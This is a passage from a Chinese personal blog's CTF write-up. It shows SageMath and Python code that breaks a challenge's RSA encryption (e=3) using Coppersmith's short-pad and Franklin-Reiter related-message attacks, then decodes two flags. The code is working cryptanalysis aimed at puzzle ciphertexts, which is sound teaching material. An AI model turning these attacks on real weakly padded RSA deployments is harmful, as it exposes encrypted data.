Ring</span></span><br><span class="line">    rres = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res.coefficients())):</span><br><span class="line">        rres += res.coefficients()[i]*(y^(res.exponents()[i][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    diff = rres.small_roots(epsilon=eps)</span><br><span class="line">    recoveredM1 = franklinReiter(n,e,diff[<span class="number">0</span>],C1,C2)</span><br><span class="line">    print(recoveredM1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testCoppersmithShortPadAttack</span><span class="params">(eps=<span class="number">1</span>/<span class="number">25</span>)</span>:</span></span><br><span class="line">    <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    <span class="keyword">import</span> binascii</span><br><span class="line">    M = <span class="string">"flag&#123;This_Msg_Is_2_1337&#125;"</span></span><br><span class="line">    M = int(binascii.hexlify(M),<span class="number">16</span>)</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    nBitSize =  <span class="number">8192</span></span><br><span class="line">    key = RSA.generate(nBitSize)</span><br><span class="line">    <span class="comment">#Give a bit of room, otherwhise the epsilon has to be tiny, and small roots will take forever</span></span><br><span class="line">    m = int(math.floor(nBitSize/(e*e))) - <span class="number">400</span></span><br><span class="line">    <span class="keyword">assert</span> (m &lt; nBitSize - len(bin(M)[<span class="number">2</span>:]))</span><br><span class="line">    r1 = random.randint(<span class="number">1</span>,pow(<span class="number">2</span>,m))</span><br><span class="line">    r2 = random.randint(r1,pow(<span class="number">2</span>,m))</span><br><span class="line">    M1 = pow(<span class="number">2</span>,m)*M + r1</span><br><span class="line">    M2 = pow(<span class="number">2</span>,m)*M + r2</span><br><span class="line">    C1 = Integer(pow(M1,e,key.n))</span><br><span class="line">    C2 = Integer(pow(M2,e,key.n))</span><br><span class="line">    CoppersmithShortPadAttack(e,key.n,C1,C2,eps)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testFranklinReiter</span><span class="params">()</span>:</span></span><br><span class="line">    p = random_prime(<span class="number">2</span>^<span class="number">512</span>)</span><br><span class="line">    q = random_prime(<span class="number">2</span>^<span class="number">512</span>)</span><br><span class="line">    n = p * q <span class="comment"># 1024-bit modulus</span></span><br><span class="line">    e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    m = randint(<span class="number">0</span>, n) <span class="comment"># some message we want to recover</span></span><br><span class="line">    r = randint(<span class="number">0</span>, n) <span class="comment"># random padding</span></span><br><span class="line"></span><br><span class="line">    c1 = pow(m + <span class="number">0</span>, e, n)</span><br><span class="line">    c2 = pow(m + r, e, n)</span><br><span class="line">    print(m)</span><br><span class="line">    recoveredM = franklinReiter(n,e,r,c1,c2)</span><br><span class="line">    print(recoveredM)</span><br><span class="line">    <span class="keyword">assert</span> recoveredM==m</span><br><span class="line">    print(<span class="string">"They are equal!"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n=<span class="number">28158376030783126462160089589823483713527137233213875572448002306591587078780130580064960928000260046723470757493523772992812185236491055072491361217940285809743091958889318723862394925161624189393204199333582056921761101170728126732633570787046368451452592297474997001720894985956809324776433753817913573764903118962295218320504483249302086522864189503976194142497460351928118211969015560337732569710308337625261805046420223294551248496856153012197979278463862836023897894535718512636307578414641240750045867326554984308461337470720249462693325847418638485693227856545631806676082705971847561028566848739943309350523</span></span><br><span class="line">    (c1,c2,c3)=(<span class="number">24224099638194324112593871012681573152728137743988130174034194747749499893806613392393262358304278286207848016575593184397104060179978140321847376670647434030870270659753891424180300938412183930402939964298221231907700551385713992208907288670440128651459855106370601996167821568454498946189809679805856760077602954185656580735443254919133313869021875507715983005654259694427753140006431537962760663821770319611657591446033183695065991242937214964884018439712856483970516075937859659014842147053482562615064262033128353761384111673580976781273192034059752430319614321781718852031021334707002690826600780316128823557078</span>, <span class="number">9346750271098236574311526832166143274981900619073634627239673835573015044474781208925371397721856252589055337535370071073022935304585017378639576719997933317896392172224331035651304165371533650982779424261861522620182573561472976299952543222698749313342053690793739259992577314602927389157124886863152775368006245054707996451092743563826965858367896714784027494674462238582099575028052030487857739015972028019673964986909534784865442448462755269733906210352597618064622408012998910837512387765999752231309660534222112023575816948992389787796776523706795068869288928522584197893586912900864981983132389327089147168146</span>,<span class="number">12107764658433896580107280538635135643387858852976620070691115333175114455948516277086646541412419646593297889201461016204186139568117475108121483620886979081055400119823555863287145558918960315604392538385365775518531415962595383790406519796107060397002742243430892069572422621367817969753308155681207288179722229190134116638193477979912363191546805420859415583321036973918671704414861068461071208456971522273733442192940846444300605718874968169235475237419035100359757819694303844991958162933063957514071374815976765116772095057060790532835820921941088145846413070125370893266694322242100018189171839236880288990785924731992240524566660760922463600094468267262479875177563252492042982465535450638009272498423063736302466479967160885598220013264243699170187377424360056887609494799576319202957855035769847474106037568257493594313444725436907261296589305657506580644724070073124760436092785070723978602029411520504130916009400359604526646351156436915392008166680858644751752849852559564642823536994015310787265345702214921009048446529410934651620740678596168179297695317825626377519087362620254075060283392495964100088104432955208048486368967069833933648053224437409662903374041626724752539021740964387214123704727358129789524527156031473687977024441000979679744414175754810038626527843431424394300602082336759566303619981176757419266691542040519548871088083534246850686949005736818866455421187638056233493672106359797782169712261131423897346468178309589638059793798304934967642857700497827862408132279349488890162419922934863936257606996005393045700768753829407234139813940831919160314036065245565171960402080772504580960750282631405024166104777299328579173845225098623353952827436661379857324363184646746357839176347923656698542515335105484998791972994614628816209171376677660216724863205662719962318372864</span>)</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    CoppersmithShortPadAttack(e, n, c1, c2, eps=<span class="number">1</span> / <span class="number">60</span>)  <span class="comment"># eps 修改为1/60，防止运行时报错</span></span><br></pre></td></tr></table></figure>
+<p>解出<code>m1 = 14267798928007396428365560655607886737475085581467204317651286694891601173603979191964725374835502820748204634274374920682729395111210727444793112294872353926825141824115704117827778094695675216464828698921238074921670590183636048747011058357804231084498721758238167600149194487214678153126480535555634610971086663039544011241052763819564356695104932836946866661</code>，而<code>flag1 = (m1 &gt;&gt; 200) % (1 &lt;&lt; 200)</code></p>
+<p>然后对于flag2，对c3直接开三次方就能得到r3 * r4，而</p>
+<script type="math/tex; mode=display">r3\cdot r4=(2^{1000}+2^{200}flag2)\cdot(2^{1001}+2^{200}padding2)</script><script type="math/tex; mode=display">=2^{2001}+2^{1201}flag2+2^{1200}padding2+2^{400}flag2\cdot padding2</script><p>令 $v=r3\cdot r4-2^{2001}$ ，则有</p>
+<script type="math/tex; mode=display">v>>1200=2flag2+padding2</script><script type="math/tex; mode=display">(v\%2^{1200})>>400=flag2\cdot padding2</script><p>然后解一元二次方程解出flag2和padding2，还要注意这里flag2解出来是<code>fake_flag!!</code>，真正的flag2其实是padding2（即下面脚本里的<code>b // 123770484255816154622664993</code>）</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">28158376030783126462160089589823483713527137233213875572448002306591587078780130580064960928000260046723470757493523772992812185236491055072491361217940285809743091958889318723862394925161624189393204199333582056921761101170728126732633570787046368451452592297474997001720894985956809324776433753817913573764903118962295218320504483249302086522864189503976194142497460351928118211969015560337732569710308337625261805046420223294551248496856153012197979278463862836023897894535718512636307578414641240750045867326554984308461337470720249462693325847418638485693227856545631806676082705971847561028566848739943309350523</span></span><br><span class="line">(c1,c2,c3)=(<span class="number">24224099638194324112593871012681573152728137743988130174034194747749499893806613392393262358304278286207848016575593184397104060179978140321847376670647434030870270659753891424180300938412183930402939964298221231907700551385713992208907288670440128651459855106370601996167821568454498946189809679805856760077602954185656580735443254919133313869021875507715983005654259694427753140006431537962760663821770319611657591446033183695065991242937214964884018439712856483970516075937859659014842147053482562615064262033128353761384111673580976781273192034059752430319614321781718852031021334707002690826600780316128823557078</span>, <span class="number">9346750271098236574311526832166143274981900619073634627239673835573015044474781208925371397721856252589055337535370071073022935304585017378639576719997933317896392172224331035651304165371533650982779424261861522620182573561472976299952543222698749313342053690793739259992577314602927389157124886863152775368006245054707996451092743563826965858367896714784027494674462238582099575028052030487857739015972028019673964986909534784865442448462755269733906210352597618064622408012998910837512387765999752231309660534222112023575816948992389787796776523706795068869288928522584197893586912900864981983132389327089147168146</span>,<span class="number">12107764658433896580107280538635135643387858852976620070691115333175114455948516277086646541412419646593297889201461016204186139568117475108121483620886979081055400119823555863287145558918960315604392538385365775518531415962595383790406519796107060397002742243430892069572422621367817969753308155681207288179722229190134116638193477979912363191546805420859415583321036973918671704414861068461071208456971522273733442192940846444300605718874968169235475237419035100359757819694303844991958162933063957514071374815976765116772095057060790532835820921941088145846413070125370893266694322242100018189171839236880288990785924731992240524566660760922463600094468267262479875177563252492042982465535450638009272498423063736302466479967160885598220013264243699170187377424360056887609494799576319202957855035769847474106037568257493594313444725436907261296589305657506580644724070073124760436092785070723978602029411520504130916009400359604526646351156436915392008166680858644751752849852559564642823536994015310787265345702214921009048446529410934651620740678596168179297695317825626377519087362620254075060283392495964100088104432955208048486368967069833933648053224437409662903374041626724752539021740964387214123704727358129789524527156031473687977024441000979679744414175754810038626527843431424394300602082336759566303619981176757419266691542040519548871088083534246850686949005736818866455421187638056233493672106359797782169712261131423897346468178309589638059793798304934967642857700497827862408132279349488890162419922934863936257606996005393045700768753829407234139813940831919160314036065245565171960402080772504580960750282631405024166104777299328579173845225098623353952827436661379857324363184646746357839176347923656698542515335105484998791972994614628816209171376677660216724863205662719962318372864</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="number">14267798928007396428365560655607886737475085581467204317651286694891601173603979191964725374835502820748204634274374920682729395111210727444793112294872353926825141824115704117827778094695675216464828698921238074921670590183636048747011058357804231084498721758238167600149194487214678153126480535555634610971086663039544011241052763819564356695104932836946866661</span></span><br><span class="line">flag1 = (m &gt;&gt; <span class="number">200</span>) % (<span class="number">1</span> &lt;&lt; <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">r34 = iroot(c3, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">v = r34 - <span class="number">2</span> ** <span class="number">2001</span></span><br><span class="line">a = v &gt;&gt; <span class="number">1200</span>   <span class="comment"># a = p + 2f</span></span><br><span class="line">b = (v % (<span class="number">2</span> ** <span class="number">1200</span>)) &gt;&gt; <span class="number">400</span>  <span class="comment"># b = pf</span></span><br><span class="line">m2 = symbols(<span class="string">'x'</span>)</span><br><span class="line">print(solve(Eq(<span class="number">2</span>*x**<span class="number">2</span>-a*x+b,<span class="number">0</span>),x))</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(flag1)+long_to_bytes(b // <span class="number">123770484255816154622664993</span>))</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/Crypto/" rel="tag"><i class="fa fa-tag"></i> Crypto</a>
+              <a href="/tags/WP/" rel="tag"><i class="fa fa-tag"></i> WP</a>
+              <a href="/tags/Pwn/" rel="tag"><i class="fa fa-tag"></i> Pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/30/buucry3/" rel="prev" title="BUUCTF Crypto WriteUp part3">
+      <i class="fa fa-chevron-left"></i> BUUCTF Crypto WriteUp part3
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80OTg5Ny8yNjM4OA=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">1.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#签到-送你一朵小红花"><span class="nav-number">1.1.</span> <span class="nav-text">[签到] 送你一朵小红花</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easystack"><span class="nav-number">1.2.</span> <span class="nav-text">easystack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#scmt"><span class="nav-number">1.3.</span> <span class="nav-text">scmt</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easycsharp"><span class="nav-number">2.1.</span> <span class="nav-text">easycsharp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Real-Base"><span class="nav-number">3.1.</span> <span class="nav-text">Real_Base</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#你们一天天的不写代码，难道是在等爱情吗"><span class="nav-number">3.2.</span> <span class="nav-text">你们一天天的不写代码，难道是在等爱情吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ChildRSA"><span class="nav-number">3.3.</span> <span class="nav-text">ChildRSA</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <a href="/">
+        <img class="site-author-image" itemprop="image"
+            src="/images/avatar.jpg"
+            alt="Shrimpwr" />
+    </a>
+  <p class="site-author-name" itemprop="name">Shrimpwr</p>
+  <div class="site-description" itemprop="description">无数渺小的思考填满了人的一生</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Shrimpwr" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Shrimpwr" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:shrimpwr@gmail.com" title="E-Mail → mailto:shrimpwr@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1349937484&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+
+<div class="copyright" style="display:inline">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-glass-martini-alt"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shrimpwr</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">102k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:33</span>
+    <span class="post-meta-divider">|</span>
+</div>
+
+        
+<div class="busuanzi-count" style = "display:inline">
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1278945960&web_id=1278945960"></script>
+  </div>
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='240,248,255' opacity='0.8' zIndex='-1' count='120' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
